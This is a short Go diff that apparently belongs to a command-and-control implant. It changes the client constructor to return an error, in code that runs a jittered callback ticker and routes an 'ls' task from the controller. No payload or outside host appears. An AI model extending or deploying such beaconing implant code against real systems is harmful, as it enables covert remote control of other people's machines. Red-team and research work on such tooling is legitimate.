@@ -20,8 +20,9 @@ func main() {
 	if err := config.Initialize(); err != nil {
 		os.Exit(1)
 	}
-	client = newClient()
-
+	if err := newClient(); err != nil {
+		os.Exit(1)
+	}
 	tickSalt := config.C.CallbackSalt
 	r := rand.New(rand.NewSource(time.Now().Unix()))
 	ticker := time.NewTicker((config.C.CallbackInterval * 1000 * time.Millisecond) - (tickSalt * time.Millisecond))
@@ -36,14 +37,17 @@ func main() {
 	}
 }
 
-func newClient() *c2.Client {
-	client = c2.NewClient()
-
+func newClient() error {
+	var err error
+	client, err = c2.NewClient()
+	if err != nil {
+		return err
+	}
 	router := c2.NewRouter()
 	router.HandleFunc(tasks.OpLS, tasks.CmdLS)
 
 	client.SetRouter(router)
-	return client
+	return nil
 }
 
 func run(registration *transport.Registration) error {
